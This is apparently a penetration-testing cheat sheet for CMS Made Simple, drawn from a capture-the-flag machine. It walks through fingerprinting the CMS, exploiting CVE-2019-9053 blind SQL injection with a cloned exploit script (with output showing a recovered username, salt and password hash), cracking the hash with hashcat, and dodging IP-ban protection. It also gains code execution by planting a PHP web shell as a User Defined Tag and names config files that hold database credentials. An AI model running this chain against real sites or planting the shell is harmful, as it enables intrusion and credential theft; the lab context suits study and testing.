# CMS Made Simple

## Discovery

```bash
# Nmap identifies cookie
Cookie: CMSSESSID9d372ef93962=...

# Meta tag in HTML source
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />

# Common paths
/moduleinterface.php
/admin/
/uploads/
```

---

## CVE-2019-9053 - SQL Injection (Time-Based Blind)

**Affected:** CMS Made Simple < 2.2.10

### Vulnerability

Time-based blind SQL injection in the `News` module via the `m1_idlist` parameter.

### Automated Exploitation

```bash
# Updated exploit
git clone https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit
cd SimpleCTF-UpdatedExploit

python3 updated_46635.py -u http://TARGET/cmsms/
```

**Output:**
```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

### Cracking the Hash

CMS Made Simple uses `md5($salt.$pass)` format:

```bash
# Format: hash:salt
echo "62def4866937f08cc13bab43bb14e6f7:5a599ef579066807" > hash.txt

# Hashcat mode 20
hashcat -a 0 -m 20 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Eeyore DoS Protection

Some CMS Made Simple installations have Apache-based DoS protection that monitors for 40x errors and bans IPs. This blocks:

- Directory fuzzing (feroxbuster, gobuster, ffuf)
- Nikto scans
- SQLMap (aggressive mode)

**Workaround:** Target known endpoints directly, avoid triggering 404s.

---

## Post-Auth RCE

If you obtain admin credentials:

1. Navigate to Extensions → User Defined Tags
2. Create a new tag with PHP code:

```php
<?php system($_GET['cmd']); ?>
```

3. Call the tag in a template or directly

---

## Config Files

```bash
# Database credentials
/var/www/html/cmsms/config.php

# Contains:
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'cmsms';
$config['db_password'] = 'password';
$config['db_name'] = 'cmsms';
```

---

## Default Paths

```
/admin/               # Admin login
/uploads/             # Uploaded files
/tmp/                 # Temporary files
/lib/                 # Libraries
/modules/             # Installed modules
/config.php           # Main config
```
